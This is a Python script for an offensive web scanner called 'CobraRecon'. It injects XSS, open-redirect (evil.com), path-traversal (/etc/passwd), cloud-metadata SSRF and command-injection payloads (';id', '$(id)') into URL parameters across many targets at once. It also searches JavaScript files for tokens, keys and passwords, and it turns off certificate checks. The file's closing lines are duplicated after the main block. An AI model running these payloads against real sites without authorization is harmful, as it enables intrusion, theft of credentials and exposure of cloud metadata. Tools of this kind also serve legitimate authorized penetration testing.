#!/usr/bin/env python3
import warnings
warnings.simplefilter("ignore")  # Ignore ALL warnings

import argparse, os, re
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from colorama import Fore, Style, init
import urllib3
urllib3.disable_warnings()

init(autoreset=True)

BANNER = f"""{Fore.LIGHTCYAN_EX}
   ▄████▄   ▒█████   ▄▄▄▄    ▒█████   ██▀███   ▄▄▄█████▓ ▒█████   ███▄    █ 
  ▒██▀ ▀█  ▒██▒  ██▒▓█████▄ ▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒▒██▒  ██▒ ██ ▀█   █ 
  ▒▓█    ▄ ▒██░  ██▒▒██▒ ▄██▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░▒██░  ██▒▓██  ▀█ ██▒
  ▒▓▓▄ ▄██▒▒██   ██░▒██░█▀  ▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░ ▒██   ██░▓██▒  ▐▌██▒
  ▒ ▓███▀ ░░ ████▓▒░░▓█  ▀█▓░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░ ░ ████▓▒░▒██░   ▓██░
  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
    ░  ▒     ░ ▒ ▒░ ▒░▒   ░   ░ ▒ ▒░   ░▒ ░ ▒░    ░      ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░        ░ ░ ░ ▒   ░    ░ ░ ░ ░ ▒    ░░   ░   ░      ░ ░ ░ ▒     ░   ░ ░ 
  ░ ░          ░ ░   ░          ░ ░     ░                  ░ ░           ░ 
  ░                   ░                                                    
     CobraRecon Universal Vulnerability Scanner
{Style.RESET_ALL}
"""

PAYLOAD_FILES = {
    "xss": "payloads/xss.txt",
    "redirect": "payloads/redirect.txt",
    "lfi": "payloads/lfi.txt",
    "ssrf": "payloads/ssrf.txt",
    "rce": "payloads/rce.txt",
}
DEFAULT_PAYLOADS = {
    "xss": ['"><svg/onload=alert(1)>'],
    "redirect": ["https://evil.com"],
    "lfi": ["../../../../etc/passwd"],
    "ssrf": ["http://169.254.169.254/latest/meta-data/"],
    "rce": [";id", "|id", "&&id", "`id`", "$(id)", "||id"],
}
MATCHES = {
    "xss": re.compile(r'(q=|s=|search=|callback=|return=|next=|url=)', re.I),
    "redirect": re.compile(r'(redirect|url|next|target)', re.I),
    "lfi": re.compile(r'(file=|path=|doc=|page=)', re.I),
    "ssrf": re.compile(r'(url=|uri=|path=|dest=|domain=|load=|file=)', re.I),
    "rce": re.compile(r'(cmd=|exec=|command=|run=|process=|shell=|cli=|query=|call=)', re.I),
}

def load_payloads(vulntype):
    file = PAYLOAD_FILES[vulntype]
    if os.path.exists(file):
        with open(file) as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            if lines:
                return lines
    return DEFAULT_PAYLOADS[vulntype]

def fuzz_url(url, vulntype, payload=None):
    try:
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        changed = False
        new_qs = []
        for k, v in qs:
            if not changed and MATCHES[vulntype].search(f"{k}="):
                new_qs.append((k, payload))
                changed = True
            else:
                new_qs.append((k, v))
        if not changed:
            return None, None
        new_query = urlencode(new_qs)
        new_url = urlunparse(parsed._replace(query=new_query))
        r = None
        if vulntype == "redirect":
            r = requests.head(new_url, allow_redirects=False, timeout=8, verify=False)
            if r.is_redirect and payload in r.headers.get('Location', ''):
                return new_url, f"[Redirect] {new_url}"
        elif vulntype == "xss":
            r = requests.get(new_url, timeout=8, verify=False)
            if "<svg" in r.text:
                return new_url, f"[XSS] {new_url}"
        elif vulntype == "lfi":
            r = requests.get(new_url, timeout=8, verify=False)
            if "root:" in r.text:
                return new_url, f"[LFI] {new_url}"
        elif vulntype == "ssrf":
            r = requests.get(new_url, timeout=8, verify=False)
            if "meta-data" in r.text:
                return new_url, f"[SSRF] {new_url}"
        elif vulntype == "rce":
            r = requests.get(new_url, timeout=8, verify=False)
            if re.search(r"uid=\d+|gid=\d+|root:|user=", r.text):
                return new_url, f"[RCE] {new_url} | payload: {payload}"
    except Exception:
        pass
    return None, None

def scan_type(urls, vulntype, outfile, max_threads=20):
    payloads = load_payloads(vulntype)
    hits = []
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {}
        for url in urls:
            for payload in payloads:
                futures[executor.submit(fuzz_url, url, vulntype, payload)] = (url, payload)
        for fut in as_completed(futures):
            try:
                res_url, result = fut.result()
                if result:
                    print(Fore.GREEN + f"{result}" + Style.RESET_ALL)
                    hits.append(result)
            except Exception:
                pass
    with open(outfile, "w") as f:
        for hit in hits:
            f.write(f"{hit}\n")
    print(Fore.YELLOW + f"[+] {len(hits)} {vulntype.upper()} results saved in {outfile}" + Style.RESET_ALL)

def scan_js_endpoints(urls, outfile):
    js_urls = [u for u in urls if u.lower().endswith('.js')]
    hits = []
    for js_url in js_urls:
        try:
            r = requests.get(js_url, timeout=8, verify=False)
            if re.search(r"(api/|token|key|auth|endpoint|password|user|url|secret)", r.text, re.I):
                hits.append(f"[JS-Interesting] {js_url}")
        except Exception:
            continue
    with open(outfile, "w") as f:
        for hit in hits:
            f.write(f"{hit}\n")
    print(Fore.LIGHTCYAN_EX + f"[+] {len(hits)} interesting JS endpoints saved in {outfile}" + Style.RESET_ALL)

def main():
    parser = argparse.ArgumentParser(description="CobraRecon: Universal Vulnerability Scanner")
    parser.add_argument("-i", "--input", required=True, help="Input file (list of URLs with parameters)")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("--threads", type=int, default=20, help="Number of threads (default: 20)")
    args = parser.parse_args()

    os.makedirs(args.output, exist_ok=True)

    print(BANNER)
    with open(args.input) as f:
        urls = [line.strip() for line in f if "=" in line and not line.startswith("#")]

    for vulntype in ["xss", "redirect", "lfi", "ssrf", "rce"]:
        print(Fore.CYAN + f"[*] Scanning for {vulntype.upper()}..." + Style.RESET_ALL)
        vt_urls = [u for u in urls if MATCHES[vulntype].search(u)]
        scan_type(vt_urls, vulntype, os.path.join(args.output, f"{vulntype}_hits.txt"), args.threads)

    print(Fore.CYAN + "[*] Scanning for interesting JS endpoints..." + Style.RESET_ALL)
    scan_js_endpoints(urls, os.path.join(args.output, "js_hits.txt"))

    print(Fore.GREEN + f"[+] All results saved in {args.output}/" + Style.RESET_ALL)

if __name__ == "__main__":
    main()


    print(Fore.GREEN + f"[+] All results saved in {args.output}/" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
